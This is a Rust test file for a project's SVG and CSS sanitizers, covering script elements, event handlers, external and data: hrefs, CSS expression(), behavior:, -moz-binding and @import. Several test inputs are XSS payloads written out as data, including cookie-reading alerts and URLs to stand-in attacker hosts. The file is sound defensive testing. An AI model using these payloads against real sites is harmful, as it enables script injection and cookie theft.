//! Adversarial tests for the A-45 tenant-content sanitizers.
//!
//! Covers (D-4 taxonomy):
//! - A-45 SVG sanitizer — script injection, event handlers, external refs,
//!   foreignObject, data-URI hrefs
//! - A-45 CSS sanitizer — expression(), javascript:, behavior:, -moz-binding,
//!   @import, data: URLs

use hearth::abuse::sanitize::{sanitize_css, sanitize_svg};

// ─────────────────────────────────────────────────────────────────────────────
// A-45 — SVG sanitizer adversarial tests
// ─────────────────────────────────────────────────────────────────────────────

/// Adversarial: `<script>` element and its body are stripped.
#[test]
fn a45_svg_script_element_stripped() {
    let svg = r#"<svg xmlns="http://www.w3.org/2000/svg"><script>alert(document.cookie)</script><circle r="5"/></svg>"#;
    let out = sanitize_svg(svg);
    assert!(
        !out.contains("<script"),
        "script element must be stripped; got: {out}"
    );
    assert!(
        !out.contains("alert"),
        "script body must be stripped; got: {out}"
    );
    assert!(
        out.contains("<circle"),
        "sibling element must be preserved; got: {out}"
    );
}

/// Adversarial: `onload` event handler attribute is stripped.
#[test]
fn a45_svg_onload_handler_stripped() {
    let svg = r#"<svg xmlns="http://www.w3.org/2000/svg"><rect onload="alert(1)" width="10" height="10"/></svg>"#;
    let out = sanitize_svg(svg);
    assert!(
        !out.contains("onload"),
        "onload handler must be stripped; got: {out}"
    );
    assert!(
        out.contains("width="),
        "safe width attribute must be preserved; got: {out}"
    );
}

/// Adversarial: arbitrary `on*` event handler (`onmouseover`) is stripped.
#[test]
fn a45_svg_arbitrary_event_handler_stripped() {
    let svg =
        r#"<svg xmlns="http://www.w3.org/2000/svg"><path onmouseover="evil()" d="M0 0"/></svg>"#;
    let out = sanitize_svg(svg);
    assert!(
        !out.contains("onmouseover"),
        "onmouseover must be stripped; got: {out}"
    );
    assert!(out.contains("d="), "path d attr must survive; got: {out}");
}

/// Adversarial: `href` pointing to external URL is stripped.
#[test]
fn a45_svg_external_href_stripped() {
    let svg = r#"<svg xmlns="http://www.w3.org/2000/svg"><use href="https://attacker.example/x.svg#icon"/></svg>"#;
    let out = sanitize_svg(svg);
    assert!(
        !out.contains("https://attacker.example"),
        "external href must be stripped; got: {out}"
    );
}

/// Adversarial: `xlink:href` pointing to external URL is stripped.
#[test]
fn a45_svg_xlink_external_href_stripped() {
    let svg = r#"<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><use xlink:href="https://evil.com/x.svg#i"/></svg>"#;
    let out = sanitize_svg(svg);
    assert!(
        !out.contains("https://evil.com"),
        "xlink:href external must be stripped; got: {out}"
    );
}

/// Adversarial: `data:` URI in `href` is stripped.
#[test]
fn a45_svg_data_uri_href_stripped() {
    let svg = r#"<svg xmlns="http://www.w3.org/2000/svg"><image href="data:image/svg+xml;base64,PHN2Zy8+"/></svg>"#;
    let out = sanitize_svg(svg);
    assert!(
        !out.contains("data:"),
        "data: href must be stripped; got: {out}"
    );
}

/// Negative: fragment `href` (`#id`) is preserved (used for internal `<use>`).
#[test]
fn a45_svg_fragment_href_preserved() {
    let svg = r##"<svg xmlns="http://www.w3.org/2000/svg"><use href="#logo-path"/></svg>"##;
    let out = sanitize_svg(svg);
    assert!(
        out.contains(r##"href="#logo-path""##),
        "fragment-only href must be preserved; got: {out}"
    );
}

/// Adversarial: `<foreignObject>` and its entire subtree are stripped.
#[test]
fn a45_svg_foreign_object_stripped() {
    let svg = r#"<svg xmlns="http://www.w3.org/2000/svg"><foreignObject width="100" height="100"><body xmlns="http://www.w3.org/1999/xhtml"><script>alert(1)</script></body></foreignObject><rect width="5" height="5"/></svg>"#;
    let out = sanitize_svg(svg);
    assert!(
        !out.to_ascii_lowercase().contains("foreignobject"),
        "foreignObject must be stripped; got: {out}"
    );
    assert!(
        !out.contains("<body"),
        "body inside foreignObject must be stripped; got: {out}"
    );
    assert!(
        out.contains("<rect"),
        "sibling rect must be preserved; got: {out}"
    );
}

/// Adversarial: `javascript:` href is stripped.
#[test]
fn a45_svg_javascript_href_stripped() {
    let svg = r#"<svg xmlns="http://www.w3.org/2000/svg"><a href="javascript:alert(1)"><text>click me</text></a></svg>"#;
    let out = sanitize_svg(svg);
    assert!(
        !out.contains("javascript:"),
        "javascript: href must be stripped; got: {out}"
    );
}

/// Adversarial: `expression()` in `style` attribute is stripped.
#[test]
fn a45_svg_style_expression_stripped() {
    let svg = r#"<svg xmlns="http://www.w3.org/2000/svg"><rect style="color:expression(alert(1))" width="10" height="10"/></svg>"#;
    let out = sanitize_svg(svg);
    assert!(
        !out.contains("expression("),
        "expression() in style must be stripped; got: {out}"
    );
    assert!(
        out.contains("width="),
        "other attrs must be preserved; got: {out}"
    );
}

/// Negative: a clean SVG with only safe elements and attributes passes through.
#[test]
fn a45_svg_clean_svg_passes_through() {
    let svg = r##"<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
  <path d="M12 2L2 22h20L12 2z" fill="#e85d04"/>
  <circle cx="12" cy="8" r="3" stroke="#fff" stroke-width="1.5"/>
</svg>"##;
    let out = sanitize_svg(svg);
    assert!(out.contains("<path"), "path must be preserved; got: {out}");
    assert!(
        out.contains("<circle"),
        "circle must be preserved; got: {out}"
    );
    assert!(
        out.contains("viewBox"),
        "viewBox must be preserved; got: {out}"
    );
    assert!(
        out.contains("fill="),
        "fill attr must be preserved; got: {out}"
    );
}

// ─────────────────────────────────────────────────────────────────────────────
// A-45 — CSS sanitizer adversarial tests
// ─────────────────────────────────────────────────────────────────────────────

/// Adversarial: `expression()` in a declaration is stripped.
#[test]
fn a45_css_expression_stripped() {
    let css = "div { color: expression(alert(document.cookie)); }";
    let out = sanitize_css(css);
    assert!(
        !out.contains("expression("),
        "expression() must be stripped; got: {out}"
    );
}

/// Adversarial: `javascript:` URL in CSS `background` is stripped.
#[test]
fn a45_css_javascript_url_stripped() {
    let css = ".x { background: url(javascript:alert(1)); }";
    let out = sanitize_css(css);
    assert!(
        !out.contains("javascript:"),
        "javascript: CSS must be stripped; got: {out}"
    );
}

/// Adversarial: `behavior:` property is stripped.
#[test]
fn a45_css_behavior_stripped() {
    let css = "li { behavior: url(http://attacker.com/evil.htc); }";
    let out = sanitize_css(css);
    assert!(
        !out.contains("behavior:"),
        "behavior: must be stripped; got: {out}"
    );
}

/// Adversarial: `-moz-binding` property is stripped.
#[test]
fn a45_css_moz_binding_stripped() {
    let css = "body { -moz-binding: url(http://attacker.com/xss.xml#xss); }";
    let out = sanitize_css(css);
    assert!(
        !out.contains("-moz-binding"),
        "-moz-binding must be stripped; got: {out}"
    );
}

/// Adversarial: `@import` rule is stripped.
#[test]
fn a45_css_import_stripped() {
    let css =
        "@import url('https://attacker.example/steal.css');\n:root { --ht-surface-base: #111; }";
    let out = sanitize_css(css);
    assert!(
        !out.contains("@import"),
        "@import must be stripped; got: {out}"
    );
    assert!(
        out.contains("--ht-surface-base"),
        "valid custom property must be preserved; got: {out}"
    );
}

/// Adversarial: `url(data:...)` in CSS is stripped.
#[test]
fn a45_css_data_url_stripped() {
    let css = ".logo { background-image: url(data:image/png;base64,abc); }";
    let out = sanitize_css(css);
    assert!(
        !out.contains("url(data:"),
        "data: CSS URL must be stripped; got: {out}"
    );
}

/// Adversarial: `progid:` filter string is stripped.
#[test]
fn a45_css_progid_stripped() {
    let css = "div { filter: progid:DXImageTransform.Microsoft.AlphaImageLoader(src='evil.png'); }";
    let out = sanitize_css(css);
    assert!(
        !out.contains("progid:"),
        "progid: must be stripped; got: {out}"
    );
}

/// Negative: valid CSS custom-property overrides pass through unmodified.
#[test]
fn a45_css_valid_custom_properties_preserved() {
    let css = ":root {\n  --ht-content-brand: #0d9488;\n  --ht-brand-from: #059669;\n}";
    let out = sanitize_css(css);
    assert!(
        out.contains("--ht-content-brand"),
        "valid CSS custom property must be preserved; got: {out}"
    );
    assert!(
        out.contains("--ht-brand-from"),
        "valid CSS custom property must be preserved; got: {out}"
    );
}

/// Adversarial: a single dangerous declaration in a block does not strip safe siblings.
#[test]
fn a45_css_safe_siblings_preserved_in_mixed_block() {
    let css =
        ":root { --ht-surface-base: #111; color: expression(alert(1)); --ht-brand: #e85d04; }";
    let out = sanitize_css(css);
    assert!(
        !out.contains("expression("),
        "expression() must be stripped; got: {out}"
    );
    assert!(
        out.contains("--ht-surface-base"),
        "safe custom prop before dangerous one must survive; got: {out}"
    );
    assert!(
        out.contains("--ht-brand"),
        "safe custom prop after dangerous one must survive; got: {out}"
    );
}

/// An SVG that fails to parse yields the empty string, not the part written
/// before the error.
#[test]
fn a45_svg_unparseable_yields_empty() {
    for svg in [
        r#"<svg xmlns="http://www.w3.org/2000/svg"><circle r="4"/><g"#,
        r#"<svg xmlns="http://www.w3.org/2000/svg"><circle r="4"/><!-- never closed"#,
    ] {
        assert_eq!(sanitize_svg(svg), "", "unparseable SVG must yield nothing: {svg}");
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// A-45 — Render paths run the sanitizers
// ─────────────────────────────────────────────────────────────────────────────

/// Collects every message handed to the transport.
#[derive(Default)]
struct CapturingSender(std::sync::Mutex<Vec<hearth::identity::email::EmailMessage>>);

impl hearth::identity::email::EmailSender for CapturingSender {
    fn send(
        &self,
        message: &hearth::identity::email::EmailMessage,
    ) -> Result<(), hearth::identity::email::EmailError> {
        self.0
            .lock()
            .unwrap_or_else(std::sync::PoisonError::into_inner)
            .push(message.clone());
        Ok(())
    }
}

/// Renders a verification email whose configured logo is `logo_svg` and
/// returns the HTML body.
fn render_email_with_logo(logo_svg: &str) -> String {
    let dir = tempfile::tempdir().expect("tempdir");
    let logo_path = dir.path().join("logo.svg");
    std::fs::write(&logo_path, logo_svg).expect("write logo");
    let sender = std::sync::Arc::new(CapturingSender::default());
    let service = hearth::identity::email::EmailService::new(
        std::sync::Arc::clone(&sender) as hearth::identity::email::SharedEmailSender,
        "Hearth".to_string(),
        Some(logo_path.to_string_lossy().into_owned()),
        hearth::identity::email::EmailBranding::default(),
        "<svg xmlns=\"http://www.w3.org/2000/svg\" viewBox=\"0 0 1 1\"></svg>".to_string(),
        None,
    )
    .expect("email service");
    service
        .send_verification_email(
            "user@example.com",
            "https://auth.example.com/verify?token=t",
            None,
            None,
            None,
        )
        .expect("send");
    let sent = sender
        .0
        .lock()
        .unwrap_or_else(std::sync::PoisonError::into_inner);
    assert_eq!(sent.len(), 1, "exactly one email must be sent");
    sent[0].html_body.clone()
}

/// The built-in logo, now sanitized on every email render, keeps its drawing:
/// gradients, their `#` references and both paths.
#[test]
fn a45_builtin_logo_survives_the_svg_sanitizer() {
    let logo = String::from_utf8_lossy(hearth::protocol::web::HEARTH_WIDE_SVG);
    let out = sanitize_svg(&logo);
    assert_eq!(out.matches("<path").count(), 2, "both paths kept: {out}");
    assert_eq!(
        out.matches("<linearGradient").count(),
        3,
        "gradients kept: {out}"
    );
    assert!(
        out.contains("href=\"#linearGradient"),
        "fragment refs kept: {out}"
    );
}

/// A configured logo SVG carrying `<script>` and `onload` reaches the
/// outgoing email without either, and keeps its drawing.
#[test]
fn a45_email_render_path_sanitizes_logo_svg() {
    let html = render_email_with_logo(
        r#"<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 10 10" onload="alert(1)"><script>alert(2)</script><circle cx="5" cy="5" r="4" fill="red"/></svg>"#,
    );
    assert!(
        html.contains("<circle"),
        "the sanitized logo must still be inlined: {html}"
    );
    let lower = html.to_ascii_lowercase();
    assert!(
        !lower.contains("<script"),
        "the email must not carry <script>: {html}"
    );
    assert!(
        !lower.contains("onload"),
        "the email must not carry onload: {html}"
    );
    assert!(
        !lower.contains("alert("),
        "no script body may survive: {html}"
    );
}
